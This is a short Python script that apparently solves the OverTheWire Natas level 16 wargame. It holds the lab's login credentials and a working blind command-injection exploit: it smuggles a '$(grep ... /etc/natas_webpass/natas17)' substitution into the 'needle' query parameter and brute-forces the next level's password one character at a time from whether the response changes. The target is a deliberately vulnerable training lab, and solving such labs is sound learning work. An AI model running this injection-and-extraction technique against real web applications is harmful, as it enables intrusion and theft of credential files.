#!/bin/python3

import requests
import string

site = "http://natas16.natas.labs.overthewire.org"
auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")

def stepOne():
    chars = ''.join([string.ascii_letters, string.digits])
    dict = []
    for char in chars:
        data = 'needle=Saturdays$(grep '+ char +' /etc/natas_webpass/natas17)'
        res = requests.get(site + '/?' + data, auth=auth)
        if not ('Saturdays' in res.text):
            dict.append(char)
            print(dict)
    print(''.join(dict))

def stepTwo():
    dict = "bdhkmnsuvBCEHIKLRSUX0179"
    password = []
    for i in range(1, 64):
        for char in dict:
            tmpPassArr = password[:]
            tmpPassArr.append(char)
            tmpPass = ''.join(tmpPassArr)
            data = 'needle=Saturdays$(grep ^'+ tmpPass +' /etc/natas_webpass/natas17)'
            res = requests.get(site + '/?' + data, auth=auth)
            print("Requesting " + tmpPass)
            if not ('Saturdays' in res.text):
                password.append(char)
                break
        print('PASS: ' + ''.join(password))


# Runnnig stepOne will produce: bdhkmnsuvBCEHIKLRSUX0179
#stepOne()
stepTwo()
